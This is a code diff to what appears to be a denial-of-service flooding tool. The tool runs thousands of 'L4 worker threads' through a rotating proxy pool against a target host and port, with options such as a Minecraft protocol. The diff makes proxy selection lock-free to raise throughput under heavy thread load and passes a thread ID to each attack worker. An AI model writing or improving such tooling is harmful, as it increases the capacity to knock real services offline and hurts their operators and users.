@@ -474,11 +474,13 @@ class TacticalProxyPool:
         with self._lock:
             if not self._proxies:
                 self._weights = []
+                self._pool_copy = []
                 return
             for p in self._proxies:
                 p_str = str(p.base)
                 p.update_score(self._failures.get(p_str, 0))
             self._weights = [p.score for p in self._proxies]
+            self._pool_copy = list(self._proxies) # Create a read-only copy for lock-free access
             self._failures = {} 
             self._last_weight_update = time()
 
@@ -494,15 +496,18 @@ class TacticalProxyPool:
                 )
 
     def get_proxy(self) -> Optional[Proxy]:
+        # Lock-free read path for maximum performance under heavy thread load
         if time() - self._last_weight_update > 60:
             self._update_weights()
-        with self._lock:
-            if not self._proxies: return None
-            try:
-                selected = random.choices(self._proxies, weights=self._weights, k=1)[0]
-                return selected.base
-            except:
-                return self._proxies[0].base
+            
+        pool = getattr(self, '_pool_copy', [])
+        weights = getattr(self, '_weights', [])
+        
+        if not pool: return None
+        try:
+            return random.choices(pool, weights=weights, k=1)[0].base
+        except:
+            return pool[0].base
 
     def __len__(self):
         with self._lock: return len(self._proxies)
@@ -2481,9 +2486,9 @@ if __name__ == "__main__":
                             protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
                 
                 logger.info(f"{bcolors.OKBLUE}[*] Tactical Engine: Deploying {threads:,} L4 worker threads...{bcolors.RESET}")
-                for _ in range(threads):
+                for thread_id in range(threads):
                     Layer4(
-                        (host, port), ref, method, event, proxy_pool, protocolid
+                        thread_id, (host, port), ref, method, event, proxy_pool, protocolid
                     ).start()
 
             logger.info(
